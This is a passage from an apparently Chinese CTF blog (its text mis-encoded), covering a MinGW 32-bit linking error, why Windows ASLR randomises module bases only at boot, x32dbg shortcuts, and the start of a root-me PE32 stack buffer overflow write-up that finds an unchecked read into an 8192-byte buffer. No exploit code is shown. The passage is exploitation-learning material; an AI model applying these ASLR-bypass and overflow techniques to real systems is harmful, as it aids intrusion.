class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmsvcrt</span><br><span class="line">collect2.exe: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™è§£å†³å‚è€ƒè¿™ç¯‡ <a target="_blank" rel="noopener" href="https://blog.csdn.net/chuanpeng0130/article/details/136382113">æ–‡ç« </a> ï¼Œå¤§æ¦‚åŸå› æ˜¯æˆ‘åŸæœ¬ä¸‹è½½çš„æ˜¯ <code>mingw64</code> ï¼Œåœ¨ç¼–è¯‘ <code>32</code> ä½ç¨‹åºçš„æ—¶å€™å°±ä¼šå‡ºé—®é¢˜ï¼Œé‡æ–°åˆ°å®˜ç½‘ä¸Šä¸‹è½½ä¸€ä¸ª <code>mingw</code> ï¼Œç„¶åä¿®æ”¹ä¸‹ç¯å¢ƒå˜é‡å°±è¡Œäº†</p>
<p>PSï¼šåæ¥åˆå‘ç°æ²¡åŠæ³• <code>64</code> ä½ç¨‹åºäº†ï¼Œç´¢æ€§åˆä¸‹è½½äº†ä¸€ä¸ª <code>mingw64</code> ï¼Œç„¶åå°†ä¸¤ä¸ªè·¯å¾„éƒ½å¯¼å…¥äº†ç¯å¢ƒå˜é‡ï¼Œ<code>32</code> ä½çš„å‘½åä¸º <code>gcc.exe</code>  <code>64</code> ä½çš„å‘½åä¸º <code>gcc64.exe</code> ï¼Œè¿™æ ·å°±å¯ä»¥è½»æ¾åˆ‡æ¢ä¸¤ä¸ª <code>gcc</code> äº†ã€‚</p>
<h2 id="å…³äº-Windows-ä¸‹çš„-ASLR-æœºåˆ¶"><a href="#å…³äº-Windows-ä¸‹çš„-ASLR-æœºåˆ¶" class="headerlink" title="å…³äº Windows ä¸‹çš„ ASLR æœºåˆ¶"></a>å…³äº Windows ä¸‹çš„ ASLR æœºåˆ¶</h2><h3 id="èµ·å› ï¼šç–‘é—®çš„äº§ç”Ÿ"><a href="#èµ·å› ï¼šç–‘é—®çš„äº§ç”Ÿ" class="headerlink" title="èµ·å› ï¼šç–‘é—®çš„äº§ç”Ÿ"></a>èµ·å› ï¼šç–‘é—®çš„äº§ç”Ÿ</h3><p>å…³äº <code>Windows</code> ä¸­ <code>ASLR</code> çš„é—®é¢˜åœ¨æˆ‘ç¬¬ä¸€æ¬¡åš <code>ret2dll</code> çš„æ—¶å€™å°±æ³¨æ„åˆ°äº†ï¼Œç¬¬ä¸€é“ <code>ret2dll</code> åšçš„æ˜¯è¿™ä¸ª [é¢˜ç›®](#root-me PE32 - Stack buffer overflow avancÃ©) ã€‚å› ä¸ºç¨‹åºä¸­æ²¡æœ‰ <code>system</code> å‡½æ•°ï¼Œéœ€è¦å» <code>msvcrt.dll</code> é‡Œè·å–ã€‚æˆ‘ç”¨ <code>x32dbg</code> çœ‹ç¨‹åºå†…å­˜çš„æ—¶å€™å‘ç° <code>system</code> çš„åœ°å€ä¸€ç›´æ²¡æœ‰æ”¹å˜ï¼Œäºæ˜¯æˆ‘å°±å¾ˆçº³é—·ï¼Œè¿™æ³„éœ²äº†ä¸ªå¯‚å¯ï¼Ÿå½“æ—¶æˆ‘ä»¥ä¸ºæ˜¯ <code>ASLR</code> æ²¡æœ‰å¼€å¯ï¼Œäºæ˜¯å°±æ”¾è¿‡äº†è¿™é‡Œã€‚è€Œä¸”é‚£é¢˜æ˜¯æ‰“çš„æœ¬åœ°ï¼Œç¬¬äºŒæ¬¡åš <a href="#2024NKCTF_%E6%9D%A5%E7%AD%BE%E4%B8%AA%E5%88%B0">ret2dll</a> æ—¶æ‰“äº†è¿œç¨‹ï¼Œæˆ‘ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²äº†è¿œç¨‹çš„ <code>dll</code> åœ°å€ï¼Œå‘ç°è¿˜æ˜¯å›ºå®šçš„ï¼Œä¸è¿‡å› ä¸º <code>checksec</code> å’Œ <code>x32dbg</code> çš„æ’ä»¶ <code>checksec</code> éƒ½æ²¡æ£€æµ‹å‡ºæ¥ç¨‹åºçš„ <code>ASLR</code> ï¼Œåˆæ”¾è¿‡äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>é™¤å»å…¥é—¨æ—¶è‡ªå·±å†™çš„ä¾‹é¢˜ <code>ret2text</code> ï¼Œç°åœ¨æˆ‘åšåˆ°äº†ç¬¬ä¸‰é“é¢˜ <a href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2020_easyoverflow">å¼ºç½‘æ¯2020_easyoverflow</a>ã€‚è¿™é“é¢˜çœ‹äº†å¸ˆå‚…ä»¬çš„ <code>wp</code> ï¼Œè¦æ³„éœ² <code>StackCookie</code> çš„å€¼ï¼ˆè¿™ä¸ªæ²¡ä»€ä¹ˆè§£é‡Šçš„ï¼Œæ­£å¸¸æ“ä½œï¼‰ï¼Œæ¥ç€è¦æ³„éœ²ç¨‹åºåŸºåœ°å€ã€‚åˆšå¼€å§‹æˆ‘è§‰å¾—ä¹Ÿå¾ˆæ­£å¸¸ï¼Œå› ä¸ºè¿™ä¸ªé¢˜å¼€äº† <code>ASLR</code> ï¼Œç¨‹åºçš„åŸºåœ°å€ä¼šéšæœºåŒ–ã€‚å¯æ˜¯æˆ‘åœ¨ä¹‹åçš„è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘çªç„¶å‘ç°ç¨‹åºçš„åŸºåœ°å€ä¼¼ä¹ä¸€ç›´æ²¡æœ‰æ”¹å˜â€¦</p>
<h3 id="æ¢ç´¢"><a href="#æ¢ç´¢" class="headerlink" title="æ¢ç´¢"></a>æ¢ç´¢</h3><p>èµ·åˆæˆ‘ä»¥ä¸ºæ˜¯ <code>x32dbg</code> ç±»ä¼¼äº <code>GDB</code> å¯ä»¥åœ¨è°ƒè¯•ç¨‹åºæ—¶è‡ªåŠ¨å…³é—­è¿›ç¨‹çš„åœ°å€éšæœºåŒ–ï¼Œäºæ˜¯åæ¥æˆ‘å…ˆè¿è¡Œç¨‹åºï¼Œè€Œåé™„åŠ è¿›ç¨‹è°ƒè¯•ï¼ŒæŸ¥çœ‹äº†ç¨‹åºåŸºåœ°å€ä¾ç„¶æ²¡æœ‰æ”¹å˜ã€‚è€Œåæˆ‘å¼€å§‹æ€€ç–‘æ˜¯ä¸æ˜¯ç¨‹åºçš„é—®é¢˜ï¼Œæˆ‘å°è¯•è‡ªå·±å»ç¼–å†™ä¸€ä¸ªå¼€å¯ <code>ASLR</code> ä¿æŠ¤çš„ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* heap = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">100</span>];</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of heap:0x%p\nAddress of stack 0x%p\nAddress of main 0x%p\nAddress of system 0x%p\n&quot;</span>, heap, <span class="built_in">stack</span>, main, &amp;system);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆšå¼€å§‹ç›´æ¥ç”¨çš„ <code>gcc</code> ï¼Œä½†æ˜¯ <code>ASLR</code> ä¸€ç›´å¼€ä¸èµ·æ¥</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233320278.png" alt="image-20240325233320278"></p>
<p>å¯¼è‡´ç¨‹åºçš„å„ç±»åœ°å€éƒ½æ˜¯å›ºå®šçš„</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233216490.png" alt="image-20240325233216490"></p>
<p>åæ¥æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°åœ¨ <code>Visual Studio</code> ä¸­ç¼–è¯‘çš„ç¨‹åºæ˜¯å¼€å¯äº† <code>ASLR</code> ä¿æŠ¤çš„</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325233716030.png" alt="image-20240325233716030"></p>
<p>å†è¿è¡Œç¨‹åºï¼ŒæŸ¥çœ‹æ‰“å°çš„åœ°å€ï¼Œå‘ç°åªæœ‰å †åœ°å€å’Œæ ˆåœ°å€æ˜¯éšæœºçš„ï¼Œè€Œç¨‹åºåŸºåœ°å€ï¼ˆè§‚å¯Ÿ <code>main</code> å‡½æ•°ï¼‰å’Œ <code>dll</code> æ¨¡å—åŠ è½½åœ°å€ï¼ˆè§‚å¯Ÿ <code>system</code> åº“å‡½æ•°ï¼‰ä¾æ—§æ˜¯å›ºå®šå€¼ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325234108163.png" alt="image-20240325234108163"></p>
<p>æ­¤æ—¶æˆ‘å¼€å§‹æ€€ç–‘è‡ªå·±æ²¡ææ˜ç™½ <code>windows</code> ä¸‹çš„ <code>ASLR</code> æœºåˆ¶åˆ°åº•æ˜¯æ€ä¹ˆä¸€å›äº‹ï¼Œç„¶åç»è¿‡æ¼«é•¿çš„æœç´¢åï¼Œæˆ‘å‘ç°äº†è¿™äº›æ–‡ç« å¯¹æˆ‘è§£å†³ç–‘é—®å¾ˆæœ‰å¸®åŠ©ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://book.crifan.com/books/explore_underlying_mechanism_binary_security/website/windows/security_mechanism/alsr.html">ASLR Â· æ¢ç©¶åº•å±‚æœºåˆ¶ï¼šäºŒè¿›åˆ¶å®‰å…¨ (crifan.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://czxvan.github.io/2023/10/22/Windwos-PWN/ASLR-in-Windows/">ASLR in Windows | czxvanâ€™s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/07/14/0day/%E5%86%85%E5%AD%98%E9%9A%8F%E6%9C%BA%E5%8C%96%E4%BF%9D%E6%8A%A4-ASLR-%E7%AE%80%E4%BB%8B/">å†…å­˜éšæœºåŒ–ä¿æŠ¤(ASLR)ç®€ä»‹ | Introspelliam</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/">ASLR - What It Is, and What It Isnâ€™t (morphisec.com)</a></p>
<p>ç»è¿‡é˜…è¯»ä¸Šé¢çš„å››ç¯‡æ–‡ç« ï¼Œç»“åˆè‡ªå·±ä¸Šé¢çš„ä»£ç æµ‹è¯•ï¼Œèƒ½å¤Ÿè®©æˆ‘æœ‰å…«æˆçš„æŠŠæ¡åšä¿¡è‡ªå·±çš„æƒ³æ³•æ˜¯æ­£ç¡®çš„â€“åœ¨ <code>windows</code> ä¸­ <code>ASLR</code> å¼€å¯ååªæœ‰å †ã€æ ˆçš„åŒºåŸŸæ˜¯éšæœºçš„ï¼Œè€Œç¨‹åºåŸºåœ°å€å’Œæ¨¡å—åŸºåœ°å€éƒ½æ˜¯åœ¨é‡å¯ç³»ç»Ÿæ—¶éšæœºçš„ï¼Œä¹‹åæ¯æ¬¡è¿è¡Œç¨‹åºéƒ½æ˜¯å›ºå®šçš„ã€‚</p>
<p>ä½†å› ä¸ºæœ€å¼€å§‹åš <code>Linux</code> ä¸‹çš„ <code>pwn</code> é¢˜æ¯”è¾ƒå¤šï¼Œ<code>ASLR+PIE</code> å¼€æ»¡æ—¶ï¼Œæ‰€æœ‰çš„åœ°å€åœ¨æ¯æ¬¡ç¨‹åºé‡æ–°è¿è¡Œæ—¶éƒ½æ˜¯éšæœºçš„ã€‚ç›¸æ¯”è¾ƒ <code>windows</code> ä¸‹çš„åœ°å€éšæœºåŒ–ï¼Œè¿™è®©æˆ‘ä¸€åº¦ä¸æ•¢åšä¿¡è‡ªå·±çš„çŒœæµ‹ã€‚è¿™æ„å‘³ç€åœ¨æœ¬åœ°åˆ†æç¨‹åºæ—¶ï¼Œæˆ‘å¯ä»¥ç”¨è°ƒè¯•å™¨ç›´æ¥æ‹¿åˆ°ç¨‹åºæˆ–æ¨¡å—çš„åŸºåœ°å€è€Œæ— éœ€æ³„éœ²ï¼Œç”šè‡³æˆ‘å¯ä»¥èŠ±ä¸€æ®µæ—¶é—´çˆ†ç ´å‡ºå›ºå®šçš„åœ°å€ï¼Œè®©éšæœºåŒ–çœ‹èµ·æ¥å½¢åŒè™šè®¾ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªåŸå› è®©æˆ‘ä¸ç¡®å®šï¼Œå› ä¸ºå…³äºè¿™ä¸ªåœ°å€éšæœºåŒ–çš„é—®é¢˜ï¼Œä¹‹å‰çœ‹å¸ˆå‚…ä»¬çš„æ–‡ç« ä¸­ä¼¼ä¹å¹¶æ²¡æœ‰æåŠã€‚</p>
<p>æŠ±ç€è¯·æ•™çš„å¿ƒæ€ç»™ <a target="_blank" rel="noopener" href="https://ret2ver.github.io/">Vergissmeinnicht</a> å¸ˆå‚…å‘äº†ä¸€å°é‚®ä»¶ï¼Œåœ¨å¾—åˆ° <strong>Vergissmeinnicht</strong> å¸ˆå‚…è‚¯å®šçš„ç­”å¤åï¼Œæˆ‘ç¡®å®šäº†ä¸Šé¢çš„çŒœæµ‹ï¼ˆå†æ¬¡æ„Ÿè°¢ <strong>Vergissmeinnicht</strong> å¸ˆå‚…ï¼‰</p>
<h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>åæ¥æˆ‘æ€ç´¢äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·çš„ã€‚</p>
<p>æˆ‘ä¸ªäººæœ‰ç‚¹å…ˆå…¥ä¸ºä¸»ï¼Œå› ä¸ºåˆšå¼€å§‹åšçš„ <code>Linux</code> ä¸‹æ¼æ´åˆ©ç”¨ï¼Œåœ¨è§è¯†äº†è¯¥ç³»ç»Ÿä¸Š <code>ASLR+PIE</code> å¼€æ»¡åï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶æ‰€æœ‰çš„åœ°å€éƒ½ä¼šè¢«éšæœºåŒ–ï¼Œè®©æˆ‘è®¤ä¸ºåœ°å€éšæœºåŒ–æœ¬è¯¥å¦‚æ­¤ã€‚è€Œåœ¨ <code>CTF</code> ä¸­çš„é¢˜ç›®åˆéƒ½æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œéœ€è¦åšçš„æ˜¯ç”¨æ¼æ´æ¥çªç ´åœ°å€éšæœºåŒ–ã€‚ä½†å®é™…ä¸Šçš„ç¨‹åºï¼ˆæ— è®ºæ˜¯ <code>windows</code> ä¸Šè¿˜æ˜¯ <code>Linux</code> ä¸Šï¼‰å¹¶ä¸æ˜¯ä¸€å®šå­˜åœ¨æ¼æ´ï¼Œå½“æ¦‚ç‡è¾ƒä½å‡ºç°äº†ç¼“å†²åŒºæº¢å‡ºæ¼æ´æ—¶ï¼Œåœ°å€éšæœºåŒ–ä¿æŠ¤èµ·åˆ°çš„æ˜¯ç¼“è§£ä½œç”¨ï¼ˆå¹¶ä¸æ˜¯ä¸ºäº†å®Œå…¨é˜²å¾¡æ”»å‡»ï¼‰ã€‚å‡è®¾æ”»å‡»è€…è¦æ”»å‡»è¿œç¨‹ç³»ç»Ÿçš„ä¸€ä¸ªæœåŠ¡ï¼Œå·²çŸ¥å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¯ <code>ASLR</code> çš„å¼€å¯è®©ç¨‹åºåŸºåœ°å€ä¸ä¼šå¤„äºä¸€ä¸ªè®©æ”»å‡»è€…å·²çŸ¥çš„å›ºå®šåœ°å€ã€‚æ”»å‡»è€…æ— æ³•åœ¨ç¬¬ä¸€æ—¶é—´ <code>ROP</code> è¿›ä¸€æ­¥æ‰©å¤§åˆ©ç”¨ï¼ˆåŒ…æ‹¬æ³„éœ²åœ°å€ï¼Œæ‰§è¡Œå±é™©å‡½æ•°ç­‰ï¼‰ï¼Œå³ä½¿ç¨‹åºåŸºåœ°å€åªä¼šåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶éšæœºä¸€æ¬¡ï¼Œä½†ä¾ç„¶èƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£æ”»å‡»ã€‚</p>
<p>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œ<code>windows</code> éƒ½è¦æ¯” <code>Linux</code> ä¸Šçš„åœ°å€éšæœºåŒ–ä¿æŠ¤æ›´è„†å¼±ï¼ˆå¯èƒ½æ˜¯ä¸ºäº†è¿è¡Œæ•ˆç‡è€ƒè™‘ï¼Ÿï¼‰ï¼Œç»“åˆè¿™ç¯‡ <a target="_blank" rel="noopener" href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/">æ–‡ç« </a> çš„å†…å®¹ï¼Œæ€»ç»“ä¸‹ <code>windows</code> ä¸­ <code>ASLR</code> çš„ç¼ºç‚¹ï¼š</p>
<ol>
<li><p>åŸºäºå¯åŠ¨æ—¶çš„éšæœºåŒ–ï¼šæ¨¡å—åŸºåœ°å€åªåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶éšæœºåŒ–ï¼Œé‡æ–°è¿è¡Œç¨‹åºï¼Œåœ°å€å¹¶ä¸ä¼šæ”¹å˜ã€‚ç»“åˆå†…å­˜æ³„éœ²æˆ–è€…æš´åŠ›ç ´è§£å¯ä»¥çªç ´ã€‚</p>
</li>
<li><p>å¯æ‰§è¡Œæ–‡ä»¶ä¸æ”¯æŒ <code>ASLR</code>ï¼šå½“å¯æ‰§è¡Œæ–‡ä»¶æˆ– <code>DLL</code> ä¸æ˜¯ä½¿ç”¨ <code>ASLR</code> æ”¯æŒç”Ÿæˆæ—¶ï¼Œä¸æ”¯æŒ ASLRã€‚å°½ç®¡ <code>Windows 8</code> å’Œ <code>Windows 10</code> è¯•å›¾å…‹æœæ­¤é™åˆ¶ï¼ˆä¾‹å¦‚å¼ºåˆ¶æ‰§è¡Œ <code>ASLR</code>ï¼‰ï¼Œä½†ä»æœ‰ä¾‹å¤–æƒ…å†µï¼ˆä¸è¿‡æš‚æ—¶è¿˜æ²¡é‡è§åˆ°ï¼‰ã€‚</p>
</li>
<li><p>æ— æ³•æ•è·æ”»å‡»ï¼š<code>ASLR</code> æ— æ³•æä¾›æœ‰å…³æ”»å‡»çš„ä»»ä½•ä¿¡æ¯ï¼Œå®ƒåªèƒ½å°½é‡è®©æ”»å‡»å¤±æ•ˆã€‚</p>
</li>
<li><p><code>ASLR</code>  ä¸ä¼šå‘å‡ºä»»ä½•è¢«æ”»å‡»çš„è­¦å‘Šï¼šé™¤äº†çœ‹åˆ°è¿›ç¨‹å´©æºƒä¹‹å¤–ï¼Œç”¨æˆ·ä¸çŸ¥é“è‡ªå·±æ­¤åˆ»æœ‰æ²¡æœ‰å—åˆ°æ”»å‡»</p>
</li>
</ol>
<h2 id="x32dbgç®€å•æ“ä½œ"><a href="#x32dbgç®€å•æ“ä½œ" class="headerlink" title="x32dbgç®€å•æ“ä½œ"></a>x32dbgç®€å•æ“ä½œ</h2><p>å…ˆä¸‹æ–­ç‚¹åè°ƒè¯•</p>
<p><code>F2</code> ä¸‹æ–­ç‚¹</p>
<p><code>F9</code> æ˜¯è·³è½¬åˆ°æœ€è¿‘çš„æ–­ç‚¹å¤„</p>
<p><code>F8</code> æ˜¯æ­¥è¿‡ï¼ˆè·³è¿‡å‡½æ•°ï¼‰</p>
<p><code>F7</code> æ˜¯æ­¥å…¥ï¼ˆè¿›å…¥å‡½æ•°ï¼‰</p>
<p><code>ctrl+F9</code> è¿è¡Œè‡³å½“å‰å‡½æ•°çš„ç»“å°¾</p>
<h1 id="ç›¸å…³é¢˜ç›®"><a href="#ç›¸å…³é¢˜ç›®" class="headerlink" title="ç›¸å…³é¢˜ç›®"></a>ç›¸å…³é¢˜ç›®</h1><h2 id="root-me-PE32-Stack-buffer-overflow-avance"><a href="#root-me-PE32-Stack-buffer-overflow-avance" class="headerlink" title="root-me PE32 - Stack buffer overflow avancÃ©"></a>root-me PE32 - Stack buffer overflow avancÃ©</h2><p><a target="_blank" rel="noopener" href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%B3%BB%E7%BB%9F/PE32-Advanced-stack-buffer-overflow?lang=zh">é¢˜ç›®é“¾æ¥</a> </p>
<p>è¿™é‡Œç»™äº† <code>ssh</code> çš„åœ°å€å’Œç«¯å£ï¼Œä¸‹é¢è¿˜æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚ç”¨ <code>ssh</code> å¯ä»¥ç™»å½•é¶æœºï¼Œç„¶åç”¨ <code>scp</code> å°†æ–‡ä»¶ç»™æ‹·è´å‡ºæ¥ï¼ˆä¸è¿‡æˆ‘æ²¡æˆåŠŸï¼Œæˆ‘ç”¨ <code>Xterminal</code> è¿æ¥ä¸Šé¶æœºåï¼Œç”¨è½¯ä»¶çš„ä¸‹è½½åŠŸèƒ½æ‹¿åˆ°äº†é™„ä»¶ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324112219021.png" alt="image-20240324112219021"></p>
<h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>åœ¨ä¸»å‡½æ•°ä¸­åˆ¤æ–­äº†æ˜¯å¦ä¼ å…¥äº†å‘½ä»¤è¡Œå‚æ•°ï¼Œå¯¹äºå‘½ä»¤è¡Œå‚æ•°çš„è¦æ±‚æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œ <code>fopen</code> ä¼šè¿”å›å…¶æ–‡ä»¶æŒ‡é’ˆå’Œæ–‡ä»¶åä¸€èµ·ä½œä¸ºå‚æ•°ä¼ å…¥ç»™ <code>manage_file</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324113735479.png" alt="image-20240324113735479"></p>
<p>åœ¨ <code>manage_file</code> å‡½æ•°ä¸­ï¼Œ<code>fseek(Stream,0,2)</code> ä¼šå°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œç„¶å <code>ftell</code> å‡½æ•°ä¼šè®¡ç®—å½“å‰æ–‡ä»¶æŒ‡é’ˆè·ç¦»æ–‡ä»¶èµ·å§‹ä½ç½®çš„åç§»æ˜¯å¤šå°‘ï¼Œä»¥æ­¤æ¥å¾—åˆ°æ–‡ä»¶çš„å¤§å°ã€‚ç„¶ååˆç”¨éå†çš„æ–¹å¼æ£€ç´¢äº†æ–‡ä»¶çš„å­—ç¬¦æ•°é‡ï¼Œå•è¯æ•°é‡ï¼Œè¡Œæ•°ã€‚æ¼æ´å‡ºç°åœ¨ <code>open</code> æ‰“å¼€æ–‡ä»¶åï¼Œç”¨ <code>read</code> å‡½æ•°ç›´æ¥å°†æ–‡ä»¶é‡Œçš„æ•°æ®è¯»åˆ°äº† <code>8192</code> å­—èŠ‚å¤§å°çš„æ•°ç»„ä¸­ï¼Œå› ä¸ºæ–‡ä»¶çš„å¤§å°ä¸ç¡®å®šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶ï¼Œè®©ç¨‹åºé€ æˆæº¢å‡ºã€‚è§‚å¯Ÿå‡½æ•°çš„ç»“å°¾ï¼Œå‘ç°æ²¡æœ‰å¼€å¯ <code>GS</code> ä¿æŠ¤ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324114031506.png" alt="image-20240324114031506"></p>
<p>ä¸‹é¢åˆ†åˆ«æ˜¯æ–‡ä»¶çš„å­—èŠ‚æ•°æ­£å¸¸å’Œå¤§é‡å­—èŠ‚æ•°çš„ä¸¤ç§æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°é€ æˆæº¢å‡ºçš„æƒ…å†µä¸‹è®©ç¨‹åºé€ æˆäº†å´©æºƒï¼ˆå³ï¼‰ï¼Œå¹¶ä¸”åŸæœ¬çš„æ–‡ä»¶æŒ‡é’ˆä¹Ÿè¢«è¦†ç›–æˆäº† <code>0x61616161</code> ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324173126201.png" alt="image-20240324173126201"></p>
